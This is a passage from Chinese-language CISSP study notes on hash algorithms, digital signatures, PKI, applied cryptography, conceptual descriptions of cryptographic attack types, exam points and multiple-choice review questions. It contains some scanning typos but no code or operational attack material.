title="7.2.1 SHA"></a>7.2.1 SHA</h4><p>　　安全散列算法(SHA)及随后衍生的SHA-l和SHA-2算法是由美国国家标准和技术协会(NIST)开发的政府标准的散列函数，并在正式的政府出版物一一安全散列标准(Secure Hash Standard，SHS)中进行了说明，此标准也被称为联邦信息处理标准(FIPS)180。SHA-l表面上可以接受任意长度的输入数据(事实上，在此算法中输入值的长度的上限大约是2097152TB)，并且生成一个160 位的消息摘要。SHA-l算法处理512位的消息分组。因此，如果消息的长度不是512的倍数，那么SHA算法就会用附加的数据填充消息，直至长度达到512的下一个最高倍数。</p><h4 id="7-2-2-MD2"><a href="#7-2-2-MD2" class="headerlink" title="7.2.2 MD2"></a>7.2.2 MD2</h4><p>　　MD2散列算法由Ronald Rivest(也就是Rivest、Shamir和Adleman中的同一人)于1989年开发，是为8位处理器提供的一种安全散列函数。MD2对消息进行填充，从而使消息的长度成为16字节的倍数。然后，该算法会计算出一个16字节的校验和，并添加到消息的结尾处。最后，通过使用完整的原始消息与添加的校验和共同生成128位的消息摘要。</p><h4 id="7-2-3-MD4"><a href="#7-2-3-MD4" class="headerlink" title="7.2.3 MD4"></a>7.2.3 MD4</h4><p>　　1990年，Rivest增强了其信息摘要的算法，进而支持32位的处理器并提高了安全级别。这种高级的算法被称为MD4。这个增强算法先对消息进行填充，确保消息的长度比512比特的倍数短64比特。例如，一条16比特的消息会用432比特的附加数据进行填充，使之达到448比特，这条消息的长度是比512比特的倍数短64比特。随后，MD4算法对512位的消息分皇岛挂行处理，经过三轮计算，最后的输出结果是一条128比特的消息摘要。</p><h4 id="7-2-4-MD5"><a href="#7-2-4-MD5" class="headerlink" title="7.2.4 MD5"></a>7.2.4 MD5</h4><p>　　1991年，Rivest发布了其消息摘要算法的下一个版本，也就是MD5。这个算法还是处理512位的消息分组，但是使用4轮明显不同的计算生成与MD2和MD4算法一样长度的消息摘要(128位)。MD5与MD4具有同样的填充要求，即消息长度必须比512位的倍数短64位。</p><p>散列算法记忆表：</p><table><thead><tr><th>算法名称</th><th>哈希值的长度(单位为位)</th></tr></thead><tbody><tr><td>HAVAL(MD5变种)</td><td>128、160、192、224和256</td></tr><tr><td>HMAC</td><td>可变</td></tr><tr><td>MD2</td><td>128</td></tr><tr><td>MD4</td><td>128</td></tr><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-224</td><td>224</td></tr><tr><td>SHA-256</td><td>256</td></tr><tr><td>SHA-384</td><td>384</td></tr><tr><td>SHA-512</td><td>512</td></tr></tbody></table><h3 id="7-3-数字签名"><a href="#7-3-数字签名" class="headerlink" title="7.3 数字签名"></a>7.3 数字签名</h3><p>　　数字签名算法的基础是公钥密码学和散列函数。数字签名过程本身并不提供任何隐私保护。数字签名只是确保满足加密目标中<br>的完整性和不可否认性。数字签名基础结构具有两个明显的目标：</p><ul><li>数字化的签名消息可以向接收方保证： 消息确实来自己声明的发送者，并且实施了不可否认性(也就是说，排除了发送者之后声称消息是伪造的情况)。</li><li>数字化的签名消息可以向接收方保证： 消息在发送方和接收方之间进行传输的过程中不会被改变。这种方法确保消息不会受到恶意的修改(第三方想要修改消息的含义)以及无意识的修改(由通信过程中的故障造成，如电磁干扰) 。</li></ul><h4 id="7-3-1-HMAC"><a href="#7-3-1-HMAC" class="headerlink" title="7.3.1 HMAC"></a>7.3.1 HMAC</h4><p>　　HMAC算法实现了部分的数字签名功能，即保证了消息在传输过程中的完整性，但是不提供不可否认性。通过使用一个共享的密钥，HMAC 可以与任何标准的消息摘要生成算法(如SHA-2)组合在一起。因此，只有知道此密钥的通信双方能够产生或验证数字签名。如果接收方解密消息摘要，但是无法将这个消息摘要与明文消息产生的消息摘要进行成功比较，那么就说明这条消息在传输过程中被更改了。因为HMAC依赖于一个共享的密钥，所以它无法提供任何的不可否认性功能(正如前面提到的)。在不使用加密的消息摘要算法与基于公钥密码学的采用计算方式的昂贵数字签名算法之间，HMAC能够起到折中的作用。</p><h4 id="7-3-2-数字签名标准"><a href="#7-3-2-数字签名标准" class="headerlink" title="7.3.2 数字签名标准"></a>7.3.2 数字签名标准</h4><p>　　在美国联邦信息处理标准(FIPS)186-4中，美国国家标准和技术协会指定了联邦政府可以使用的数字签名算法，该标准也被称为数字签名标准(DSS)。这个文档指定美国联邦政府批准的所有数字签名算法都必须使用SHA-2散列函数。DSS还指定了可以被用于支持数字签名基础结构的加密算法。目前存在下面三种经过批准的标准加密算法：</p><ul><li>数字签名算法(DSA)，在FIPS 186-4中指定。</li><li>RSA算法，在ANSI X9.31中指定。</li><li>椭圆曲线数字签名算法(ECDSA)，在ANSI X9.62中指定。</li></ul><h3 id="7-4-公钥基础设施-PKI"><a href="#7-4-公钥基础设施-PKI" class="headerlink" title="7.4 公钥基础设施(PKI)"></a>7.4 公钥基础设施(PKI)</h3><p>　　公钥加密的主要优点是使原本互不认识的双方之间的通信变得容易。受信任的公钥基础设施(PKI)层次使得这一点成为可能。这种信任允许结合非对称和对称算法以及哈希和数字证书，为我们提供混合加密方式。</p><h4 id="7-4-1-证书"><a href="#7-4-1-证书" class="headerlink" title="7.4.1 证书"></a>7.4.1 证书</h4><p>　　数字证书为通信双方提供了保证，保证正在与之通信的人确实具有他们所宣称的身份。数字证书本质上是个人公钥的认可副本。当用户验证证书确实是由可信证书颁发机构(CA)发布时，他们就相信这个公钥是合法的。数字证书包含特定的身份标识信息，并且其结构归国际标准X.509决定。遵循X.509标准的证书包含下列数据：</p><ul><li>证书遵循的X.509版本</li><li>序列号(来自证书建立者)</li><li>签名算法标识符(指定证书授权机构对证书的内容进行数字签名时使用的技术)</li><li>发布者姓名(发布证书的证书授权机构的身份标识)</li><li>有效期(指定证书有效的日期和时间：开始的日期、时间，以及结束的日期、时间)</li><li>主体的名字(包括区分实体身份的唯一名字或DN，相应实体拥有证书中包含的公钥)</li><li>主体的公钥(证书的内容：证书拥有者用于建立安全通信的实际公钥)</li></ul><h4 id="7-4-2-证书授权机构"><a href="#7-4-2-证书授权机构" class="headerlink" title="7.4.2 证书授权机构"></a>7.4.2 证书授权机构</h4><p>　　证书授权机构(CA)将公钥基础设施绑定在一起。这些中立的组织机构为数字证书提供公证服务。为了从著名的CA处获得数字证书，必须亲自前往其代理机构，并且出示适当的身份识别文档。下面的列表中包括一些主要的CA：</p><ul><li>Symantec</li><li>Thawte</li><li>GeoTrust</li><li>GlobalSign</li><li>Comodo Limited</li><li>Starfield Technologies</li><li>GoDaddy</li><li>DigiCert</li><li>Network Solutions. LLC</li><li>Entrust</li></ul><p>　　注册授权机构(RA)在数字证书发布之前帮助CA验证用户的身份。队本身并不直接发布证书，但是在认证过程中扮演重要的角色，从而允许CA远程验证用户的身份。</p><h4 id="7-4-3-证书的生成与撤消"><a href="#7-4-3-证书的生成与撤消" class="headerlink" title="7.4.3 证书的生成与撤消"></a>7.4.3 证书的生成与撤消</h4><h5 id="1-注册"><a href="#1-注册" class="headerlink" title="1. 注册"></a>1. 注册</h5><p>　　当希望获得一个数字证书时，你必须首先采用某种方式向证书授权机构证明身份，这个过程被称为注册。</p><h5 id="2-验证"><a href="#2-验证" class="headerlink" title="2. 验证"></a>2. 验证</h5><p>　　当收到来自希望与之通信的人的数字证书时，就需要通过使用CA的公钥检查CA的数字签名来验证这个证书。接着，必须检查并确保证书并没有公布在证书撤消列表(Certificate Revocation List，CRL)中。此时，假如满足下列要求，那么就可以认定在证书中列出的公钥是可信的：</p><ul><li>CA的数字签名是可信的</li><li>你信任CA</li><li>证书没有被列在CRL中</li><li>证书实际上包含你信任的数据</li></ul><h5 id="3-撤消"><a href="#3-撤消" class="headerlink" title="3. 撤消"></a>3. 撤消</h5><p>　　有时，证书授权机构会由于下列某种原因需要撤消证书：</p><ul><li>证书遭到破坏(例如，证书所有者不慎丢失了私钥)</li><li>证书被错误地发放(例如，CA错误地发放了一个没有进行正确验证的证书)</li><li>证书的细节发生变化(例如，主体的名字发生了变化)</li><li>安全性关联发生变化(例如，担保这份证书的组织机构不再雇用主体)</li></ul><p>　　可以使用下列两种技术来验证证书的可靠性以及确定撤消的证书：</p><ul><li><strong>证书撤消列表</strong> 证书撤消列表(CRL)由不同的证书授权机构进行维护，并且包含CA发布的己被撤消的证书的序列号以及撤消生效的日期和时间。证书撤消列表的主要缺点是它们必须定期下载并交叉参照，这样就会在证书被撤消和通知最终用户证书撤消之间存在一段时间延迟。然而，CRL仍然是今天检查证书状况的最常见方法。</li><li><strong>联机证书状态协议(Online Certificate Status Protocol，OCSP)</strong> 这个协议通过提供实时证书验证方法消除了认证撤消列表所带来的固有延迟。当客户端收到一份证书时，就会向CA的OCSP服务器发送OCSP请求。服务器随后回应这份证书的状态(有效、无效或未知) 。</li></ul><h4 id="7-4-4-非对称密钥的管理"><a href="#7-4-4-非对称密钥的管理" class="headerlink" title="7.4.4 非对称密钥的管理"></a>7.4.4 非对称密钥的管理</h4><ul><li><p>明智地选择加密系统<br>选择算法公开的加密系统，其算法必须经过行业专家的彻底检查。慎重选择使用”黑箱”途径的加密系统和维护算法的秘密性，这对于密码系统的完整性来说至关重要。</p></li><li><p>以适当的方式选择密钥<br>选择密钥长度时应当考虑、安全需求与性能之间的平衡。此外，应当确认密钥真正随机。密钥内的任何模式都会增加攻击者破译加密和减弱密码系统安全性的可能性。</p></li><li><p>使用公钥加密时，一定要保证私钥的机密性<br>在任何情况下都不能允许其他人获知你的私钥。需要记住的是，偶尔允许某人访问私钥，会持久地危害使用该密钥加密的所有通信(无论是过去、当前还是将来)，并且准许第三方能够成功地进行假冒。</p></li><li><p>密钥在服务一段时期后应当停止使用<br>许多组织机构具有强制的密码轮换需求，从而防止未被发现的密钥泄露。如果没有必须遵循的正式策略，那么可以基于密钥的使用频率选择适当的密钥轮换时间间隔。如果可能的话，可以几个月更改一次密钥对。</p></li><li><p>备份密钥<br>如果由于数据损坏、崩溃或其他情况丢失包含私钥的文件，那么无疑希望具有可用的备份。此时，既可以创建自己的备份，也可以使用维护备份的密钥托管服务。在任何情况下，都需要确保以安全的方式处理备份。毕竟，备份与主密钥文件一样重要!</p></li></ul><h3 id="7-5-密码学的应用"><a href="#7-5-密码学的应用" class="headerlink" title="7.5 密码学的应用"></a>7.5 密码学的应用</h3><h4 id="7-5-1-便携式设备"><a href="#7-5-1-便携式设备" class="headerlink" title="7.5.1 便携式设备"></a>7.5.1 便携式设备</h4><p>　　许多组织转向加密来保护这些设备上的数据，以防止它们被错误放置和使用。目前流行的操作系统版本都包括磁盘加密功能，使其便于应用和管理便携式设备上的数据加密。各种各样的商业工具可以提供额外的功能和管理能力。这些工具之间的主要区别在于它们是如何保护存储在内存中的密钥的，它们是否提供完整的磁盘或卷加密，以及是否将与基于硬件的可信平台模块(frusted Platform Module，TPM)进行集成并提供附加的安全性。选择加密软件的任何努力都应该包括对这些特性的分析。</p><h4 id="7-5-2-电子邮件"><a href="#7-5-2-电子邮件" class="headerlink" title="7.5.2 电子邮件"></a>7.5.2 电子邮件</h4><p>　　对于电子邮件来说，简明就是成本效益最高的选项，不过有时密码学提供了无法避免使用的特定安全服务。因为保护安全也具有成本效益，所以加密电子邮件需要遵守下列规则：</p><ul><li>如果在发送邮件时需要实现机密性，那么就加密邮件。</li><li>如果需要维护邮件的完整性，那么就必须对邮件进行散列运算。</li><li>如果需要实现身份认证和完整性，那么就应当对邮件进行数字化签名。</li><li>如果需要实现机密性、完整性、身份认证和不可否认性，那么就应当对邮件进行加密和数字化签名。</li></ul><p>　　目前广泛使用的一些电子邮件标准：</p><ul><li><p>可靠隐私(PGP)<br>PGP有两个可用的版本。商业版本使用RSA进行密钥交换，使用IDEA进行加密/解密，使用MD5生成消息摘要。免费版本则使用Diffie-Helhnan密钥交换、Carlisle Adams/Stafford Tavares(CAST)128位的加密/解密算法以及SHA-1散列函数。</p></li><li><p>安全多用途互联网邮件扩展协议(S/MIME)<br>S/MIME使用RSA加密算法，并且己经得到包括RSA安全公司在内的业界主要机构的支持。S/MIME依靠X.509证书交换密码系统密钥。这些证书包含的公钥被用于数字签名和较长通信会话中使用的对称密钥交换。RSA是SIMIME支持的唯一一个公钥密码学协议，这个协议支持AES和3DES 对称加密算法。</p></li></ul><h4 id="7-5-3-Web-应用"><a href="#7-5-3-Web-应用" class="headerlink" title="7.5.3 Web 应用"></a>7.5.3 Web 应用</h4><p>　　SSL协议由Netscape公司开发，提供对客户机/服务器之间的网站流量进行加密的服务。安全套接字层上的超文本传输协议(HTTPS)使用443端口在Web服务器和客户端浏览器之间协商加密通信会话。SSL依赖在浏览器与Web服务器之间交换数字证书以协商加密/解密参数。SSL协议的目标是建立安全的通信通道，使整个Web浏览器会话保持开放。它取决于对称和非对称加密的组合。具体过程涉及以下步骤：</p><ul><li>(1) 当用户访问一个网站时，浏览器检索Web服务器的证书，并从中提取服务器的公共密钥。</li><li>(2) 然后，浏览器创建一个随机的对称密钥，使用服务器的公钥来加密，然后将加密的对称密钥发送到服务器上。</li><li>(3) 随后，服务器使用自己的私钥解密对称密钥，这两个系统使用对称加密密钥来交换未来的交互信息。</li></ul><p>　　隐写术(steganography)是使用密码学技术在另一条消息内嵌入秘密泊’息的方法。这种算法是通过修改组成图像文件的数据中最不重要的数据位进行工作的。变化非常微小，以至于对图像的浏览没有明显的影响。这种技术允许通信双方以简单的方式隐藏消息，例如在其他人毫无察觉的情况下，在Web页面的插图里嵌入秘密的消息。</p><h4 id="7-5-4-数字版权管理-DRM"><a href="#7-5-4-数字版权管理-DRM" class="headerlink" title="7.5.4 数字版权管理(DRM)"></a>7.5.4 数字版权管理(DRM)</h4><p>　　数字版权管理(Digital Rights Management，DRM)软件使用加密来加强对数字媒体版权的限制。使用场景有：</p><ul><li>音乐DRM</li><li>电影DRM</li><li>电子书DRM</li><li>视频游戏DRM</li><li>文档DRM</li></ul><h4 id="7-5-5-网络连接"><a href="#7-5-5-网络连接" class="headerlink" title="7.5.5 网络连接"></a>7.5.5 网络连接</h4><h5 id="1-链路加密"><a href="#1-链路加密" class="headerlink" title="1. 链路加密"></a>1. 链路加密</h5><p>　　安全管理人员使用两种类型的加密技术来保护在网络上传输的数据的安全：</p><ul><li>链路加密使用软件或硬件解决方案在两个点之间建立一条安全隧道，对进入隧道一端的所有通信数据都进行加密，并且对流出隧道另一端的所有通信数据都进行解密，从而保护整条通信线路的安全。例如，某公司通过一条数据线连接两个办公室，可以使用链路加密技术来防止攻击者在两个办公室之间的某一点进行的监控活动。</li><li>端到端加密用于保护双方仰的日，客户端和服务器)之间的通信安全，并且可以独立于链路加密实施。在发送者和接收者之间传递使用PGP的邮件，就是端到端加密的例子。这种技术可以阻止入侵者监控加密链路安全端的传输数据或者通过未加密链路传送的数据。</li></ul><p>　　链路加密和端到端加密技术之间的关键差异在于： 在链路加密中，所有的数据(包括头、尾、地址和路由数据)也会被加密，因此每个数据包必须在每一跳(each hop)都被解密，这样数据包才能被正确地路由至下一跳，然后数据包在继续发送之前又被重新加密，这就降低了路由的速度。端到端加密技术不加密头、尾、地址和路由数据，因此数据包从一点移到另一点的速度加快了，但是这种技术更容易遭到嗅探器和偷听者的攻击。当加密发生在OSI模型的较高层时，通常会使用端到端加密技术; 如果加密发生在OSI模型的较低层，通常会使用链路加密技术。</p><h5 id="2-IPSec"><a href="#2-IPSec" class="headerlink" title="2. IPSec"></a>2. IPSec</h5><p>　　网络协议安全(IPSec)标准就是这样一种支持安全通信的体系结构。IPSec是由互联网工程任务组(IETF)确立的标准体系结构，并且能够在两个实体之间建立信息交换的安全信道。IPSec通过公钥密码学来提供加密、访问控制、不可否认性以及消息身份认证，井且一般使用IP协议。IPSec主要被用于虚拟专用网(VPN)，因此可以工作在运输模式或隧道模式中。IPSec通常与二层隧道协议(L2TP)在一起，成为L2TP/IPSec。IPSec协议为安全网络通信提供了完整的基础设施。IPSec已经得到广泛认可，并且现在许多商业性的操作系统中也提供了这个协议。IPSec依赖于安全关联，井且存在下列两个主要组件：</p><ul><li>身份验证头(Authentication Header，AH)提供消息完整性和不可否认性的保证。AH还提供身份认证和访问控制，并且可以防止重放攻击。</li><li>安全封装有效载荷(Encapsulating Security Payload，ESP)提供数据包内容的机密性和完整性。ESP还提供加密和有限的身份认证，并且可以防止重放攻击。</li></ul><p>　　在运行时，通过创建安全关联(Security Association，SA)来建立IPSec会话。SA表示通信会话，井且记录与特定连接有关的任何配置和状态信息。SA表示单一连接。如果期望双向信道，那么就需要两个SA，每个方向分别使用一个SA。此外，如果希望支持使用AH和ESP的双向信道，那么就需要建立4个SA。</p><h5 id="3-ISAKMP"><a href="#3-ISAKMP" class="headerlink" title="3. ISAKMP"></a>3. ISAKMP</h5><p>　　网络安全关联密钥管理协议(ISAKMP)通过协商、建立、修改和删除安全关联为IPSec提供后台的安全支持服务。正如你在前面一节中学到的那样，IPSec依赖于安全关联的系统。这些安全关联通过使用ISAKMP进行管理。正如在Intemet RFC 2408中阐述的一样，ISAKMP具有下列4个基本要求：</p><ul><li>对通信对等方进行身份认证</li><li>建立并管理安全关联</li><li>提供密钥生成机制</li><li>防止遭受威胁(例如，重放和拒绝服务攻击)</li></ul><h5 id="4-无线互联"><a href="#4-无线互联" class="headerlink" title="4. 无线互联"></a>4. 无线互联</h5><ul><li><strong>有线等价隐私</strong> 安全团体最初通过引入有线等价隐私队Tired Equivalent Privacy，WEP)提供64和128位的加密边工页，从而保护无线LAN内的通信。IEEE 802.11中将WEP描述为无线网络连接标准的一个可选组件。</li><li><strong>WiFi安全访问</strong> 通过实现临时密钥完整性协议(Temporal Key Integrity Protocol，TKIP)并消除危害WEP的密码学弱点，WPA(WiFi Protected Access)改进了WEP加密。通过将TKIP替换为AES加密算法，WPA2进一步改善了WPA技术。这两种技术都是适合现代无线网络使用的安全算法。</li></ul><p>　　IEEE 802.1x是另一种常用的无线安全标准，它为有线和无线网络中的身份认证和密钥管理提供了灵活的架构。为了使用802.1x，客户端需要运行被称为supplicant的软件。supplicant软件与身份认证服务器进行通信。成功进行身份认证之后，网络交换机或无线接入点就允许客户端访问无线网络。WPA被设计为与802.1x身份认证服务器进行交互。</p><h3 id="7-6-密码学攻击"><a href="#7-6-密码学攻击" class="headerlink" title="7.6 密码学攻击"></a>7.6 密码学攻击</h3><ul><li><strong>分析攻击</strong> 这是一种试图降低算法复杂性的代数运算。分析攻击关注于算法本身的逻辑性。</li><li><strong>实现攻击</strong> 这种攻击类型利用密码学系统的实现中的弱点，关注于对软件代码的利用，不仅仅涉及错误与缺陷，而且还涉及编写加密系统程序所使用的方法。</li><li><strong>统计攻击</strong> 统计攻击利用密码系统中的统计弱点，例如无法生成随机数和浮点错误。统计攻击试图发现驻留密码学应用程序的硬件或操作系统中的漏洞。</li><li><strong>蛮力攻击</strong> 蛮力攻击十分简单。这种攻击尝试每种可能的、有效的密钥或密码组合。蛮力攻击涉及使用大规模的处理能力，对保护通信安全的密钥进行有系统的猜测。针对没有缺点的协议，通过蛮力攻击发现密钥所需的平均时间与密钥的长度成正比。如果具有足够的时间，蛮力攻击总是会成功。密钥长度每增加一位，由于潜在的密钥数加倍，因此执行蛮力攻击的时间也会加倍。有两种方法可使攻击者提升蛮力攻击的效果：<ul><li>彩虹表提供预先计算的密码散列值，这些通常用于破解以密码散列方式存储的系统中的密码。</li><li>专为蛮力攻击设计和开发的专业化的、可扩展的计算硬件将大大提高这种攻击方法的效率。</li></ul></li><li><strong>频率分析和仅知密文攻击</strong> 在许多情况下，你唯一拥有的信息是加密后的密文信息，即所谓的仅知密文攻击。在这种情况下，频率分析就是一种己证明可行的对抗简单密码的技术。它计算每个字母出现在密文中的次数。使用你掌握的知识，宇母E、T、0、A、I和N是最常见的英语字母，可以测试几个假设：<ul><li>如果这些字母在密文中最常见，这个密码可能是移位密码，只是重新排列明文字符但不改变它们。</li><li>如果其他字母在密文中最常见，密码可能是某种形式的置换密码并代替明文字符。这是对频率分析的简单概述，这个技术的众多复杂的变种可以用来对付多表密码和其他复杂的密码。</li></ul></li><li><strong>已知明文攻击</strong> 在己知明文攻击中，攻击者具有己加密消息的副本以及用于产生密文(副本)的明文消息。知道了这些消息，可以极大地帮助攻击者破解较弱的编码。</li><li><strong>选定密文攻击</strong> 在选定密文攻击中，攻击者能够解密所选的部分密文消息，并且可以使用己解密的那部分消息来发现密钥。</li><li><strong>选定明文攻击</strong> 在选定明文攻击中，攻击者能够加密所选的明文消息，随后可以分析加密算法输出的密文。</li><li><strong>中间相遇攻击</strong> 攻击者可以使用中间相遇攻击击败使用两轮加密的加密算法。这种攻击导致双重DES(2DES)很快被抛弃，并且转而使用三重DES(3DES)这种增强的DES 加密技术。在中间相遇攻击中，攻击者使用己知的明文消息。然后，使用每一种可能的密钥(kl)加密明文，同时使用所有可能的密钥(k2)解密相当的密文。当发现存在匹配时，相应的密钥对(kl，k2)就代表了双重加密的两个部分。这种类型的攻击通常只需花费破解一轮加密算法(或2n，而不是预计的2n* 2n)所需时间的两倍，一轮加密算法提供了最小强度的附加保护措施。</li><li><strong>中间人攻击</strong> 在中间人攻击中，怀有恶意的人置身于通信双方之间的位置并截获所有的通信(包括密码学会话的设置)。攻击者对始发者的初始化请求做出响应，井且建立与始发者的安全会话。然后，攻击者伪装成始发者，使用不同的密钥与预期的接收者建立另一个安全会话。这样一来，攻击者就能够”坐在”通信双方的中间，读取流经的所有数据流。</li><li><strong>生日攻击</strong> 生日攻击也被称为冲突攻击或逆向散列匹配，它能够寻找散列函数一一对应特性中的缺陷。在这种攻击中，怀有恶意的人在数字化签名的通信中寻找可以生成相同消息摘要的不同消息，从而维持原有数字签名的有效性。</li><li><strong>重放攻击</strong> 重放攻击被用于对付那些没有结合临时保护措施的加密算法。在这种攻击中，怀有恶意的人拦截通信双方之间的加密消息(通常是身份认证的请求)，然后”重放”捕获的信息以打开新的会话。通过在每条消息中结合时间标记和过期时间，就可以防御这种攻击。</li></ul><h3 id="7-7考试要点"><a href="#7-7考试要点" class="headerlink" title="7.7考试要点"></a>7.7考试要点</h3><ul><li><strong>理解在非对称密码系统中使用的密钥类型</strong> 公钥在通信参与者之间是自由共享的，而私钥是要求保密的。为了加密消息，应当使用接收方的公钥。为了解密消息，应当使用自己的私钥。为了签名信息，也应当使用自己的私钥。为了验证签名，应当使用发送者的公钥。</li><li><strong>熟悉三种主要的公钥密码系统</strong> 1977年，由阳vest、Shamir和Adleman开发的RSA 是最著名的公钥密码系统，依赖于对质数乘积进行因数分解的难度。El Gamal是Diffie-Hellman密钥交换算法的扩展，依赖于模运算。椭圆曲线加密算法依赖于椭圆曲线离散对数问题，在密钥的长度相同时，能提供比其他算法更高的安全性。</li><li><strong>知道散列函数的基本要求</strong> 优秀的散列函数具有5 个要求： 它们必须允许任意长度的输入值，提供固定长度的输出值，使得计算任意输入值的散列函数相对简单，提供单向功能并且是无冲突的。</li><li><strong>熟悉4种主要的散列算法</strong> 安全散列算法(SHA)的后继算法SHA-l和SHA-2构成了政府标准的消息摘要函数。SHA-l生成160位的消息摘要，SHA-2支持最大512位的可变长度的消息摘要，SHA-3还在开发制定中，而NIST 稍晚些将发布最终版本。</li><li><strong>知道密码加盐如何提高密码散列的安全性</strong> 当直接使用在密码文件中散列存储的密码时，攻击者可能利用预先计算值的彩虹表来识别常用的密码。在散列之前将盐添加到密码中，降低了彩虹表攻击的有效性。</li><li><strong>理解如何产生和验证数字签名</strong> 为了数字化签名消息，首先要使用散列函数生成消息摘要。然后，用自己的私钥加密消息摘要。为了验证消息中的数字签名，需要使用发送者的公钥解密签名，随后将解密得到的消息摘要与自己产生的消息摘要进行比较。如果二者匹配，那就说明接收的消息是可信的。</li><li><strong>了解数字签名标准(DSS)的组件</strong> 数字签名标准使用SHA-l和SHA-2消息摘要函数和下列三种加密算法中的一种： 数字签名算法(DSA) 、RSA算法或椭圆曲线数字签名算法(ECDSA)。</li><li><strong>理解公钥基础设施(PKI )</strong> 在公钥基础设施中，证书授权机构(CA)生成包含系统用户的公钥的数字证书。然后，用户把这些证书分发给希望进行通信的人。证书接收方会使用CA的公钥来验证证书。</li><li><strong>了解常见的保护电子邮件安全的密码学应用</strong> 用于被加密消息的新兴标准是S/MIME协议。其他流行的电子邮件安全协议包括Phil Zimmerman的可靠隐私(PGP)。电子邮件加密的大多数用户依赖于将这项技术构建到他们的电子邮件客户端或他们的基于Web的电子邮件服务。</li><li><strong>了解常见的保护Web 活动安全的密码学应用</strong> 安全Web通信的事实标准是使用安全传输层协议(TLS)或旧的安全套接字层(SSL)上的HTTP。大多数的网络浏览器都支持这两种标准。</li><li><strong>了解常见的保护网络连接安全的密码学应用</strong> IPSec协议标准提供了加密网络通信的通用架构，并且被内建在许多常见的操作系统中。IPSec的运输模式针对对等通信方式加密数据包的内容，隧道模式则针对网关间的通信方式加密整个数据包(包括头信息)。</li><li><strong>能够描述IPseco IPSec是一种在IP上支持安全通信的安全体系架构</strong> IPSec来用运输模式或隧道模式建立安全的信道。它既可以被用于在计算机之间建立直接的通信，也可以被用于在网络之间建立VPN。IPSec使用两个协议： 身份验证头(AH)和封装安全有效载荷(ESP) 。</li><li><strong>解释常见的密码学攻击类型</strong> 穷举攻击(又称蛮力攻击)试图通过随机的组合找到正确的加密密钥。己知明文攻击、选定密文攻击和选定明文攻击都要求攻击者具有除了密文以外的其他一些信息。中间相遇攻击利用了使用两轮加密的协议。中间人攻击是欺骗通信双方与攻击者进行通信，而不是通信双方彼此之间直接通信。生日攻击尝试找到散列函数中的冲突。重放攻击则企图重用身份认证请求。</li><li><strong>了解数字版权管理(DRM)的用途</strong> 数字版权管理(DRM)解决方案允许内容所有者执行对内容的使用限制。DRM解决方案通常保护娱乐内容，如音乐、电影和电子书，但偶尔也可见于企业中，用于保护文档中存储的敏感信息。</li></ul><h3 id="7-8-复习题"><a href="#7-8-复习题" class="headerlink" title="7.8 复习题"></a>7.8 复习题</h3><ol><li><p>在RSA公钥密码系统中，下列哪个数字总是最大?<br>A. e<br>B. n<br>C. p<br>D. q</p></li><li><p>El Gamal密码体系的基础是什么加密算法形式?<br>A. RSA<br>B. Diffie-Hellman<br>C. 3DES<br>D. IDEA</p></li><li><p>如果Richard要发送一条用公钥密码系统加密过的消息给Sue，他用哪个密钥加密这条消息?<br>A. Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>如果用El Gamal公钥密码系统加密一条2048位的明文消息，产生的密文信息有多长?<br>A. 1024 位<br>B. 2048 位<br>C. 4096 位<br>D. 8192 位</p></li><li><p>Acme Widgets目前在全公司范围内使用1024位的RSA加密标准。该公司计划从RSA转换成椭圆曲线加密系统。如果要保持相同的加密强度，应该使用多长的ECC密钥?<br>A. 160 位<br>B. 512 位<br>C. 1024 位<br>D. 2048 位</p></li><li><p>John 想要产生2048位的消息摘要，并计划发送给Mary。如果他使用SHA-l散列算法，这条特定消息的消息摘要的长度是多少?<br>A. 160 位<br>B. 512 位<br>C. 1024 位<br>D. 2048 位</p></li><li><p>下列哪个技术被认为是有缺陷的并且不应该再被使用?<br>A. SHA-2<br>B. PGP<br>C. WEP<br>D. TLS</p></li><li><p>WPA使用什么加密技术保护无线通信?<br>A. TKIP<br>B. DES<br>C. 3DES<br>D. AES</p></li><li><p>Richard收到Sue发送给他的加密消息。他应该用什么密钥来解密消息?<br>A . Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>Richard想要对正在发送给Sue的消息进行数字签名，以便于Sue能够确认这条消息来自于他，没有在传输过程中被篡改。他应该使用什么密钥来加密这条摘要消息?<br>A. Richard 的公钥<br>B. Richard 的私钥<br>C. Sue 的公钥<br>D. Sue 的私钥</p></li><li><p>下列哪个算法不受数字签名标准支持?<br>A. 数字签名算法<br>B. RSA<br>C. El Gamal DSA<br>D. Elliptic Curve DSA</p></li><li><p>哪个国际电信联盟(ITU)标准用于管理安全电子通信中的数字证书的创建和支持?<br>A. X.500<br>B. X.509<br>C. X.900<br>D. X.905</p></li><li><p>什么密码系统为商业版的Phil Zimmerman的PGP(可靠隐私)安全邮件系统提供加密/解密技术?<br>A. ROT13<br>B. IDEA<br>C. ECC<br>D. El Gamal</p></li><li><p>什么TCP/IP通信端口被TLS通信所使用?<br>A. 80<br>B. 220<br>C. 443<br>D. 559</p></li><li><p>什么类型的密码攻击提出了双重DES(2DES)不比标准的DES加密有效?<br>A. 生日攻击<br>B. 选定明文攻击<br>C. 中间相遇攻击<br>D. 中间人攻击</p></li><li><p>以下哪些工具可以用来提高暴力破解攻击的有效性?<br>A. 彩虹表<br>B. 分级审查<br>C. TKIP<br>D. 随机增强</p></li><li><p>以下哪个链接会被WPA加密进行保护?<br>A. 防火墙到防火墙<br>B. 路由器到防火墙<br>C. 客户端到无线接入点<br>D. 无线接入点到路由器</p></li><li><p>使用证书撤销列表的主要缺点是什么?<br>A. 密钥管理<br>B. 延迟<br>c. 记录保留<br>D. 暴力攻击的漏洞</p></li><li><p>下列加密算法中的哪一个现在被认为是不安全的?<br>A. El Gamal<br>B. RSA<br>C. Skipjack<br>D. Merkle-Hellman Knapsack</p></li><li><p>IPSec 定义了什么?<br>A. 针对特定配置的所有可能的安全分类<br>B. 一个用于建立安全通信通道的框架<br>C. Biba模型中的有效过渡状态<br>D. TCSEC安全类别</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（6）——密码学与对称加密算法</title>
